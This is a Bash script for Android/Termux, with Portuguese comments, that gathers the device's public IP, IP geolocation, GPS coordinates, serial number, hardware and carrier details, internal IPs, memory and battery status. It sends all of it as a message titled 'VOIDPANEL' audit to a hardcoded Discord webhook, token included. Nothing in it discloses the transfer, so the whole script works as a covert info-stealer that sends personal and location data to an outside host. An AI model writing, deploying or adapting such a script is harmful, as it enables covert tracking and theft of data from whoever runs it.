#!/bin/bash

# CONFIGURACAO DO WEBHOOK
URL="https://discord.com/api/webhooks/1474865009459859467/FuON2EHoo1e9LjLPi9cZoeT3IwEO-FSUcW0T2MpSjnvY8MUhvHuGTHc6qq74fi4NF7Ho"

# Funcao para limpar texto (remove quebras de linha e aspas que quebram o JSON)
clean() { echo "$1" | tr -d '\n\r"' | sed 's/\\/\\\\/g'; }

# 1. LOCALIZACAO E REDE MUNDIAL
PUB_IP=$(curl -s --connect-timeout 5 https://ifconfig.me || echo "0.0.0.0")
LOC_RAW=$(curl -s "http://ip-api.com")
LOC_INFO=$(clean "$(echo "$LOC_RAW" | tr ',' '\n' | tr -d '{}')")

# 2. GPS (APENAS SE TIVER TERMUX:API INSTALADO)
GPS=$(clean "$(termux-location 2>/dev/null | grep -E "latitude|longitude|accuracy" | tr -d ' ,')")
[ -z "$GPS" ] && GPS="GPS desativado ou sem permissao"

# 3. IDENTIDADE E HARDWARE
MODEL=$(clean "$(getprop ro.product.model)")
BRAND=$(clean "$(getprop ro.product.brand)")
MANUF=$(clean "$(getprop ro.product.manufacturer)")
BOARD=$(clean "$(getprop ro.product.board)")
HARDW=$(clean "$(getprop ro.hardware)")
SERIAL=$(clean "$(getprop ro.serialno)")
CPU_ABI=$(clean "$(getprop ro.product.cpu.abi)")

# 4. SISTEMA E OPERADORA
ANDROID=$(clean "$(getprop ro.build.version.release)")
SDK=$(clean "$(getprop ro.build.version.sdk)")
PATCH=$(clean "$(getprop ro.build.version.security_patch)")
OPERADORA=$(clean "$(getprop gsm.operator.alpha)")
SIM_STATE=$(clean "$(getprop gsm.sim.state)")
KERNEL=$(clean "$(uname -a)")
UPTIME=$(clean "$(uptime -p)")

# 5. REDE INTERNA E MEMORIA
IPS=$(clean "$(hostname -I 2>/dev/null || ip addr show | grep 'inet ' | awk '{print $2}')")
RAM=$(clean "$(free -h | awk '/Mem:/ {print $3 "/" $2}')")
DISK=$(clean "$(df -h /data 2>/dev/null | awk 'NR==2 {print $4 " livres de " $2}')")
BATERIA=$(clean "$(termux-battery-status 2>/dev/null | grep -E "percentage|status" | tr '\n' ' ')")

# 6. MONTAGEM DO PAYLOAD (FORMATO ULTRA SEGURO)
PAYLOAD=$(cat <<EOF
{
  "content": "AUDITORIA COMPLETA - VOIDPANEL",
  "embeds": [{
    "title": "DADOS TÉCNICOS TOTAIS",
    "color": 0,
    "fields": [
      {"name": "Localizacao e IP", "value": "IP: $PUB_IP\nGPS: $GPS\nInfo: $LOC_INFO", "inline": false},
      {"name": "Dispositivo", "value": "Marca: $BRAND\nFab: $MANUF\nModelo: $MODEL\nPlaca: $BOARD\nSerial: $SERIAL\nHardware: $HARDW\nCPU: $CPU_ABI", "inline": false},
      {"name": "Software e Rede", "value": "Android: $ANDROID (SDK $SDK)\nPatch: $PATCH\nKernel: $KERNEL\nUptime: $UPTIME\nOperadora: $OPERADORA ($SIM_STATE)\nIPs: $IPS", "inline": false},
      {"name": "Status Físico", "value": "Bateria: $BATERIA\nRAM: $RAM\nDisco: $DISK", "inline": false}
    ]
  }]
}
EOF
)

# 7. ENVIO
curl -s -H "Content-Type: application/json" -X POST -d "$PAYLOAD" "$URL"
